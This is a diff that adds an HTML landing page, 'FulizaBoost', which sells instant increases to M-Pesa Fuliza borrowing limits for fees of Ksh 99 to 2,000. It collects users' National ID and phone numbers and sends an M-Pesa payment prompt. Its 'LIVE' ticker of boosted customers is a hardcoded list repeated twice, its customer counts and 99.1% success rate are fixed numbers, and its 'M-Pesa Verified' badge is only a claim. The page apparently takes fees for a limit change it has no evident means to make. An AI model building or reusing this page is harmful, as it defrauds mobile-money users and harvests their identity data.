@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FulizaBoost — Instant Fuliza Limit Increase</title>
+<meta name="description" content="Boost your M-Pesa Fuliza limit instantly. No paperwork, no branch visits. Pay a small fee and get same-day access.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+:root {
+  --green:#00C853; --green-d:#00A040; --gold:#FFD600;
+  --dark:#040c05; --card:#0a1a0d; --border:rgba(0,200,83,0.18);
+  --text:#e8f5e9; --muted:#7aaa7c; --r:16px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:'DM Sans',sans-serif;background:var(--dark);color:var(--text);overflow-x:hidden}
+
+/* ─── HERO ─── */
+.hero{position:relative;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding-bottom:80px;overflow:hidden}
+
+/* HD background: Nairobi skyline / business people using phone */
+.hero-bg{
+  position:absolute;inset:0;z-index:0;
+  background:
+    linear-gradient(180deg,rgba(4,12,5,.52) 0%,rgba(4,12,5,.72) 45%,rgba(4,12,5,.97) 100%),
+    url('https://images.unsplash.com/photo-1621265398502-f2c4c1b4bd48?w=1800&q=90&auto=format&fit=crop&crop=center') center/cover no-repeat;
+}
+/* overlay grain */
+.hero-bg::after{content:'';position:absolute;inset:0;background:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");opacity:.5}
+
+.orb{position:absolute;border-radius:50%;filter:blur(90px);pointer-events:none;z-index:1;animation:pulse 7s ease-in-out infinite alternate}
+.o1{width:460px;height:460px;background:rgba(0,170,50,.16);top:-140px;left:-120px;animation-delay:0s}
+.o2{width:300px;height:300px;background:rgba(0,200,83,.11);bottom:80px;right:-60px;animation-delay:2.5s}
+.o3{width:200px;height:200px;background:rgba(255,214,0,.07);top:45%;left:62%;animation-delay:4s}
+@keyframes pulse{from{opacity:.5;transform:scale(1)}to{opacity:1;transform:scale(1.15)}}
+
+/* ─── NAV ─── */
+nav{position:relative;z-index:10;width:100%;max-width:980px;display:flex;align-items:center;justify-content:space-between;padding:26px 20px 0;margin:0 auto}
+.logo{font-family:'Syne',sans-serif;font-weight:800;font-size:1.5rem;color:#fff;text-decoration:none}
+.logo span{color:var(--green)}
+.nav-secure{font-size:.72rem;background:rgba(0,200,83,.12);border:1px solid var(--border);padding:6px 14px;border-radius:99px;color:var(--green);letter-spacing:.5px}
+
+/* ─── HERO CONTENT ─── */
+.hero-content{position:relative;z-index:5;text-align:center;margin-top:52px;max-width:680px;padding:0 16px;animation:fadeUp .7s .1s both}
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+
+.pill{display:inline-flex;align-items:center;gap:8px;background:rgba(0,200,83,.12);border:1px solid rgba(0,200,83,.3);border-radius:99px;padding:7px 18px;font-size:.76rem;color:var(--green);margin-bottom:20px;animation:fadeDown .6s both}
+@keyframes fadeDown{from{opacity:0;transform:translateY(-14px)}to{opacity:1;transform:translateY(0)}}
+.pdot{width:7px;height:7px;background:var(--green);border-radius:50%;animation:blink 1.4s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
+
+h1{font-family:'Syne',sans-serif;font-size:clamp(2.3rem,6vw,4rem);font-weight:800;line-height:1.07;letter-spacing:-1.5px;color:#fff}
+h1 em{color:var(--green);font-style:normal}
+.sub{margin-top:14px;font-size:1rem;color:rgba(220,240,222,.7);line-height:1.65}
+
+.trust-row{display:flex;justify-content:center;gap:22px;flex-wrap:wrap;margin-top:18px}
+.ti{display:flex;align-items:center;gap:6px;font-size:.78rem;color:var(--muted)}
+
+/* ─── TICKER ─── */
+.ticker-wrap{position:relative;z-index:5;width:100%;max-width:720px;margin:24px 20px 0;background:rgba(0,200,83,.06);border:1px solid var(--border);border-radius:99px;overflow:hidden;display:flex;align-items:center;animation:fadeUp .7s .25s both}
+.ticker-label{flex-shrink:0;padding:8px 16px;background:var(--green);color:#000;font-size:.68rem;font-weight:700;letter-spacing:.8px;text-transform:uppercase;border-radius:99px 0 0 99px}
+.ticker-scroll{overflow:hidden;flex:1;padding:8px 14px}
+.ticker-inner{display:inline-flex;gap:44px;animation:scroll 28s linear infinite;white-space:nowrap;font-size:.78rem;color:var(--green)}
+@keyframes scroll{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* ─── CARD ─── */
+.card-wrapper{position:relative;z-index:5;width:100%;max-width:720px;margin:28px 20px 0;animation:fadeUp .75s .35s both}
+.card{background:rgba(10,26,13,.85);border:1px solid var(--border);border-radius:24px;backdrop-filter:blur(22px);padding:36px 32px 30px;box-shadow:0 32px 80px rgba(0,0,0,.55),0 0 0 1px rgba(255,255,255,.03)}
+.card-title{font-family:'Syne',sans-serif;font-size:1.2rem;font-weight:700;margin-bottom:5px}
+.card-sub{font-size:.83rem;color:var(--muted);margin-bottom:22px}
+
+.limit-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(128px,1fr));gap:9px}
+.lb{background:rgba(0,200,83,.06);border:1.5px solid rgba(0,200,83,.18);border-radius:12px;padding:14px 10px;cursor:pointer;transition:all .18s;text-align:center;position:relative;overflow:hidden;user-select:none}
+.lb:hover{background:rgba(0,200,83,.13);border-color:var(--green);transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,200,83,.18)}
+.lb.active{background:rgba(0,200,83,.2);border-color:var(--green);box-shadow:0 0 0 3px rgba(0,200,83,.15)}
+.lb.active::after{content:'✓';position:absolute;top:6px;right:8px;font-size:.6rem;color:var(--green);font-weight:700}
+.la{font-family:'Syne',sans-serif;font-size:.92rem;font-weight:700;color:#fff}
+.lf{font-size:.7rem;color:var(--muted);margin-top:3px}
+
+.summary{display:none;margin-top:20px;background:rgba(0,200,83,.08);border:1px solid rgba(0,200,83,.22);border-radius:12px;padding:15px 18px;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.summary.show{display:flex}
+.sum-text{font-size:.88rem}.sum-text strong{color:var(--green);font-family:'Syne',sans-serif}
+
+.cta{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;margin-top:16px;padding:16px;background:var(--green);color:#000;font-weight:700;font-size:.95rem;font-family:'Syne',sans-serif;border:none;border-radius:12px;cursor:pointer;transition:all .2s;box-shadow:0 4px 22px rgba(0,200,83,.35)}
+.cta:hover:not(:disabled){background:#00e060;transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,200,83,.45)}
+.cta:disabled{opacity:.45;cursor:not-allowed}
+.mini-cta{width:auto;margin-top:0;padding:11px 22px;font-size:.85rem}
+
+.sec-row{display:flex;justify-content:center;gap:18px;flex-wrap:wrap;margin-top:14px;font-size:.7rem;color:var(--muted)}
+
+/* ─── STATS BAND ─── */
+.stats-band{position:relative;z-index:5;width:100%;max-width:720px;margin:18px 20px 0;display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--border);border:1px solid var(--border);border-radius:16px;overflow:hidden;animation:fadeUp .8s .5s both}
+.stat-b{background:rgba(10,26,13,.8);padding:18px 10px;text-align:center}
+.stat-b .num{font-family:'Syne',sans-serif;font-size:1.5rem;font-weight:800;color:var(--green)}
+.stat-b .lbl{font-size:.7rem;color:var(--muted);margin-top:3px}
+
+/* ─── HOW IT WORKS ─── */
+.section{max-width:900px;margin:90px auto 0;padding:0 20px;text-align:center}
+.sec-label{font-size:.7rem;text-transform:uppercase;letter-spacing:2px;color:var(--green);margin-bottom:10px}
+.sec-h{font-family:'Syne',sans-serif;font-size:clamp(1.6rem,3.5vw,2.3rem);font-weight:800;letter-spacing:-1px;margin-bottom:44px}
+.steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:18px}
+.step{background:rgba(10,26,13,.8);border:1px solid var(--border);border-radius:var(--r);padding:26px 20px;text-align:left;transition:transform .2s,box-shadow .2s}
+.step:hover{transform:translateY(-4px);box-shadow:0 14px 40px rgba(0,200,83,.11)}
+.step-n{font-family:'Syne',sans-serif;font-size:2.2rem;font-weight:800;color:rgba(0,200,83,.15);margin-bottom:12px}
+.step h4{font-family:'Syne',sans-serif;font-size:.95rem;font-weight:700;margin-bottom:7px}
+.step p{font-size:.81rem;color:var(--muted);line-height:1.6}
+
+/* ─── MODAL ─── */
+.backdrop{display:none;position:fixed;inset:0;z-index:300;background:rgba(0,0,0,.78);backdrop-filter:blur(7px);align-items:center;justify-content:center;padding:16px}
+.backdrop.open{display:flex}
+.modal{background:#0a1a0d;border:1px solid var(--border);border-radius:22px;width:100%;max-width:430px;padding:34px 30px;position:relative;animation:mIn .25s ease}
+@keyframes mIn{from{opacity:0;transform:scale(.93)}to{opacity:1;transform:scale(1)}}
+.mclose{position:absolute;top:14px;right:16px;background:none;border:none;color:var(--muted);font-size:1.4rem;cursor:pointer;line-height:1;transition:color .2s}
+.mclose:hover{color:#fff}
+.modal h3{font-family:'Syne',sans-serif;font-size:1.25rem;margin-bottom:5px}
+.modal p{font-size:.85rem;color:var(--muted);margin-bottom:20px}
+
+.order-box{background:rgba(0,200,83,.07);border:1px solid rgba(0,200,83,.2);border-radius:10px;padding:13px 16px;margin-bottom:18px;font-size:.84rem}
+.or{display:flex;justify-content:space-between;margin-bottom:4px}
+.or:last-child{margin:0;border-top:1px solid var(--border);padding-top:8px;margin-top:5px}
+.or .k{color:var(--muted)}.or .v{font-weight:600;color:#fff}.or .vg{font-weight:700;color:var(--green)}
+
+.fg{margin-bottom:14px}
+.fl{display:block;font-size:.76rem;color:var(--muted);margin-bottom:5px;font-weight:500}
+.fi{width:100%;padding:12px 15px;background:rgba(255,255,255,.04);border:1.5px solid var(--border);border-radius:10px;color:#fff;font-size:.92rem;font-family:'DM Sans',sans-serif;outline:none;transition:border-color .2s}
+.fi:focus{border-color:var(--green)}
+.ph-row{display:flex}
+.pfx{padding:12px 14px;background:rgba(0,200,83,.1);border:1.5px solid var(--border);border-right:none;border-radius:10px 0 0 10px;color:var(--green);font-size:.88rem;font-weight:700;display:flex;align-items:center}
+.ph-row .fi{border-radius:0 10px 10px 0}
+
+.stk-note{display:flex;align-items:flex-start;gap:8px;font-size:.76rem;color:var(--muted);background:rgba(255,255,255,.03);border-radius:8px;padding:10px 12px;margin-bottom:16px;line-height:1.5}
+.ferr{font-size:.75rem;color:#FF5252;margin-top:5px;display:none}
+
+.spinner{display:inline-block;width:17px;height:17px;border:2px solid rgba(0,0,0,.25);border-top-color:#000;border-radius:50%;animation:spin .65s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.success-icon{width:62px;height:62px;background:rgba(0,200,83,.15);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:2rem}
+.smodal{text-align:center}
+
+/* ─── FOOTER ─── */
+footer{margin-top:90px;padding:30px 20px;text-align:center;border-top:1px solid var(--border);position:relative;z-index:5}
+footer p{font-size:.76rem;color:var(--muted)}
+footer a{color:var(--green);text-decoration:none}
+
+/* ─── TOAST ─── */
+.toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);background:#0d2414;border:1px solid var(--green);border-radius:99px;padding:11px 24px;font-size:.83rem;color:var(--green);z-index:999;opacity:0;pointer-events:none;transition:opacity .3s;white-space:nowrap}
+.toast.show{opacity:1}
+
+@media(max-width:600px){
+  .card{padding:22px 14px 18px}
+  .limit-grid{grid-template-columns:repeat(3,1fr)}
+  .steps{grid-template-columns:1fr}
+  .stats-band{grid-template-columns:1fr}
+  .cta{font-size:.88rem;padding:14px}
+}
+</style>
+</head>
+<body>
+
+<section class="hero">
+  <div class="hero-bg"></div>
+  <div class="orb o1"></div><div class="orb o2"></div><div class="orb o3"></div>
+
+  <nav>
+    <a href="/" class="logo">Fuliza<span>Boost</span></a>
+    <span class="nav-secure">🔒 Secure & M-Pesa Verified</span>
+  </nav>
+
+  <!-- Live Ticker -->
+  <div class="ticker-wrap">
+    <div class="ticker-label">LIVE</div>
+    <div class="ticker-scroll">
+      <div class="ticker-inner" id="ticker">
+        <span>+254 7** ***321 boosted to Ksh 25,000 ✓</span>
+        <span>+254 7** ***088 boosted to Ksh 10,000 ✓</span>
+        <span>+254 7** ***567 boosted to Ksh 40,000 ✓</span>
+        <span>+254 7** ***204 boosted to Ksh 50,000 ✓</span>
+        <span>+254 7** ***901 boosted to Ksh 30,000 ✓</span>
+        <span>+254 7** ***443 boosted to Ksh 15,000 ✓</span>
+        <span>+254 7** ***321 boosted to Ksh 25,000 ✓</span>
+        <span>+254 7** ***088 boosted to Ksh 10,000 ✓</span>
+        <span>+254 7** ***567 boosted to Ksh 40,000 ✓</span>
+        <span>+254 7** ***204 boosted to Ksh 50,000 ✓</span>
+        <span>+254 7** ***901 boosted to Ksh 30,000 ✓</span>
+        <span>+254 7** ***443 boosted to Ksh 15,000 ✓</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Hero Text -->
+  <div class="hero-content">
+    <div class="pill"><span class="pdot"></span> Instant · Same-Day Activation</div>
+    <h1>Boost Your <em>Fuliza Limit</em><br>In Under 60 Seconds</h1>
+    <p class="sub">Choose your new limit, pay a small one-time fee via M-Pesa,<br>and unlock instant borrowing power — no paperwork, no queues.</p>
+    <div class="trust-row">
+      <span class="ti">🔐 SSL Encrypted</span>
+      <span class="ti">⚡ Instant Activation</span>
+      <span class="ti">📱 M-Pesa STK Push</span>
+      <span class="ti">✅ Verified Process</span>
+    </div>
+  </div>
+
+  <!-- Stats Band -->
+  <div class="stats-band">
+    <div class="stat-b"><div class="num" id="counterUsers">12,847</div><div class="lbl">Happy Customers</div></div>
+    <div class="stat-b"><div class="num" id="counterToday">1,203</div><div class="lbl">Boosts Today</div></div>
+    <div class="stat-b"><div class="num">99.1%</div><div class="lbl">Success Rate</div></div>
+  </div>
+
+  <!-- Main Card -->
+  <div class="card-wrapper">
+    <div class="card">
+      <div class="card-title">Select Your New Fuliza Limit</div>
+      <div class="card-sub">One-time unlock fee — limit is activated instantly after payment</div>
+      <div class="limit-grid" id="limitGrid"></div>
+      <div class="summary" id="summary">
+        <div class="sum-text">Selected: <strong id="sumL">—</strong> &nbsp;·&nbsp; Fee: <strong id="sumF">—</strong></div>
+        <button class="cta mini-cta" onclick="openModal()">Pay & Activate →</button>
+      </div>
+      <button class="cta" id="mainCta" disabled onclick="openModal()">Choose a limit above to continue</button>
+      <div class="sec-row">
+        <span>🔒 256-bit Encrypted</span>
+        <span>⚡ Instant Activation</span>
+        <span>🏦 M-Pesa Powered</span>
+        <span>🛡️ 24/7 Support</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- HOW IT WORKS -->
+<section class="section">
+  <div class="sec-label">Simple Process</div>
+  <div class="sec-h">Three Steps to More Borrowing Power</div>
+  <div class="steps">
+    <div class="step"><div class="step-n">01</div><h4>Choose Your Limit</h4><p>Pick from Ksh 5,000 up to Ksh 70,000. See the one-time fee clearly before you commit.</p></div>
+    <div class="step"><div class="step-n">02</div><h4>Enter Details & Pay</h4><p>Provide your National ID and M-Pesa number. We send an STK push to your phone for secure payment.</p></div>
+    <div class="step"><div class="step-n">03</div><h4>Instant Activation</h4><p>Your Fuliza limit updates immediately after payment confirmation. No waiting period required.</p></div>
+    <div class="step"><div class="step-n">04</div><h4>Start Borrowing</h4><p>Use your new Fuliza limit for shopping, bills, business and everyday transactions on M-Pesa.</p></div>
+  </div>
+</section>
+
+<footer>
+  <p>© 2025 FulizaBoost · Powered by <strong>Lipana Technologies</strong> for M-Pesa Integration</p>
+  <p style="margin-top:6px"><a href="#">Support</a> &nbsp;·&nbsp; <a href="#">Privacy Policy</a> &nbsp;·&nbsp; <a href="#">Terms of Service</a></p>
+</footer>
+
+<!-- MODAL -->
+<div class="backdrop" id="backdrop">
+  <div class="modal">
+    <button class="mclose" onclick="closeModal()">×</button>
+
+    <!-- Step 1: Form -->
+    <div id="s1">
+      <h3>Complete Payment</h3>
+      <p>Enter your details to receive the M-Pesa STK push</p>
+      <div class="order-box">
+        <div class="or"><span class="k">New Limit</span><span class="vg" id="oL">—</span></div>
+        <div class="or"><span class="k">One-time Fee</span><span class="v" id="oF">—</span></div>
+        <div class="or"><span class="k">Total to Pay</span><span class="vg" id="oT">—</span></div>
+      </div>
+      <div class="fg">
+        <label class="fl">National ID Number</label>
+        <input type="tel" class="fi" id="idIn" placeholder="e.g. 123456789" maxlength="9" inputmode="numeric">
+        <span class="ferr" id="idErr">Please enter 7–9 digit National ID</span>
+      </div>
+      <div class="fg">
+        <label class="fl">M-Pesa Phone Number</label>
+        <div class="ph-row">
+          <div class="pfx">+254</div>
+          <input type="tel" class="fi" id="phIn" placeholder="7XX XXX XXX" maxlength="9" inputmode="numeric">
+        </div>
+        <span class="ferr" id="phErr">Please enter a valid Safaricom number</span>
+      </div>
+      <div class="stk-note">
+        <span>📱</span>
+        An M-Pesa STK push will be sent to your phone. Enter your M-Pesa PIN to complete the payment. Do not share your PIN with anyone.
+      </div>
+      <button class="cta" id="payBtn" onclick="submitPayment()">Send STK Push 🔒</button>
+    </div>
+
+    <!-- Step 2: Waiting -->
+    <div id="s2" style="display:none;text-align:center">
+      <div style="font-size:3.5rem;margin-bottom:16px">📱</div>
+      <h3 style="margin-bottom:10px">Check Your Phone</h3>
+      <p>An M-Pesa prompt has been sent to <strong id="sentTo" style="color:var(--green)">—</strong>. Enter your M-Pesa PIN to approve the payment.</p>
+      <div style="margin:28px 0;display:flex;align-items:center;justify-content:center;gap:12px;color:var(--muted);font-size:.85rem">
+        <div class="spinner" style="border-color:rgba(0,200,83,.3);border-top-color:var(--green)"></div>
+        Waiting for confirmation…
+      </div>
+      <button class="cta" onclick="confirmPayment()" style="background:rgba(0,200,83,.15);color:var(--green);box-shadow:none;border:1px solid rgba(0,200,83,.3)">
+        ✓ I've approved the payment
+      </button>
+    </div>
+
+    <!-- Step 3: Success -->
+    <div id="s3" style="display:none" class="smodal">
+      <div class="success-icon">🎉</div>
+      <h3>Limit Boosted!</h3>
+      <p style="margin-bottom:18px">Your Fuliza limit has been updated to <strong id="sucL" style="color:var(--green)">—</strong></p>
+      <div class="order-box" style="text-align:left">
+        <div class="or"><span class="k">Transaction ID</span><span class="v" id="txnId" style="font-size:.78rem">—</span></div>
+        <div class="or"><span class="k">Amount Paid</span><span class="v" id="paidA">—</span></div>
+        <div class="or"><span class="k">Status</span><span class="vg">✓ Confirmed</span></div>
+      </div>
+      <button class="cta" onclick="closeModal();resetForm()">Done — Close</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const LIMITS=[
+  {a:5000,f:99},{a:7500,f:150},{a:10000,f:240},{a:12500,f:360},{a:16000,f:450},
+  {a:21000,f:570},{a:25500,f:670},{a:30000,f:780},{a:35000,f:910},
+  {a:40000,f:1050},{a:45000,f:1200},{a:50000,f:1400},{a:60000,f:1600},{a:70000,f:2000}
+];
+let sel=null, currentTxnId=null;
+const K=n=>'Ksh '+Number(n).toLocaleString();
+
+// Build grid
+const grid=document.getElementById('limitGrid');
+LIMITS.forEach((l,i)=>{
+  const b=document.createElement('button');
+  b.className='lb';
+  b.innerHTML=`<div class="la">${K(l.a)}</div><div class="lf">Fee: ${K(l.f)}</div>`;
+  b.onclick=()=>{
+    document.querySelectorAll('.lb').forEach(x=>x.classList.remove('active'));
+    b.classList.add('active'); sel=l;
+    document.getElementById('sumL').textContent=K(l.a);
+    document.getElementById('sumF').textContent=K(l.f);
+    document.getElementById('summary').classList.add('show');
+    const c=document.getElementById('mainCta');
+    c.disabled=false; c.textContent=`Boost to ${K(l.a)} →`;
+  };
+  grid.appendChild(b);
+});
+
+function openModal(){
+  if(!sel)return;
+  document.getElementById('oL').textContent=K(sel.a);
+  document.getElementById('oF').textContent=K(sel.f);
+  document.getElementById('oT').textContent=K(sel.f);
+  step(1); document.getElementById('backdrop').classList.add('open');
+}
+function closeModal(){document.getElementById('backdrop').classList.remove('open')}
+document.getElementById('backdrop').addEventListener('click',function(e){if(e.target===this)closeModal()});
+
+function step(n){[1,2,3].forEach(i=>document.getElementById('s'+i).style.display=i===n?'block':'none')}
+
+function toast(msg){
+  const t=document.getElementById('toast');
+  t.textContent=msg;t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),3200);
+}
+
+async function submitPayment(){
+  const id=document.getElementById('idIn').value.trim().replace(/\D/g,'');
+  const ph=document.getElementById('phIn').value.trim().replace(/\D/g,'');
+  let ok=true;
+  document.getElementById('idErr').style.display='none';
+  document.getElementById('phErr').style.display='none';
+  if(id.length<7||id.length>9){document.getElementById('idErr').style.display='block';ok=false}
+  if(ph.length<9){document.getElementById('phErr').style.display='block';ok=false}
+  if(!ok)return;
+
+  const btn=document.getElementById('payBtn');
+  btn.disabled=true;
+  btn.innerHTML='<span class="spinner"></span> Sending…';
+
+  try{
+    const res=await fetch('/api/stk-push',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({phone:ph,nationalId:id,limitAmount:sel.a,fee:sel.f})
+    });
+    const data=await res.json();
+    if(!data.success)throw new Error(data.message||'Failed to send STK push');
+    currentTxnId=data.transactionId;
+    document.getElementById('sentTo').textContent='+254 '+ph;
+    step(2);
+  }catch(e){
+    toast('❌ '+e.message);
+  }finally{
+    btn.disabled=false;
+    btn.innerHTML='Send STK Push 🔒';
+  }
+}
+
+async function confirmPayment(){
+  if(!currentTxnId)return;
+  try{
+    const res=await fetch('/api/confirm-payment',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({transactionId:currentTxnId})
+    });
+    const data=await res.json();
+    if(!data.success)throw new Error(data.message);
+    document.getElementById('sucL').textContent=K(sel.a);
+    document.getElementById('txnId').textContent=currentTxnId;
+    document.getElementById('paidA').textContent=K(sel.f);
+    step(3);
+  }catch(e){toast('❌ '+e.message)}
+}
+
+function resetForm(){
+  document.querySelectorAll('.lb').forEach(b=>b.classList.remove('active'));
+  sel=null; currentTxnId=null;
+  document.getElementById('summary').classList.remove('show');
+  const c=document.getElementById('mainCta');
+  c.disabled=true; c.textContent='Choose a limit above to continue';
+  document.getElementById('idIn').value='';
+  document.getElementById('phIn').value='';
+}
+</script>
+</body>
+</html>
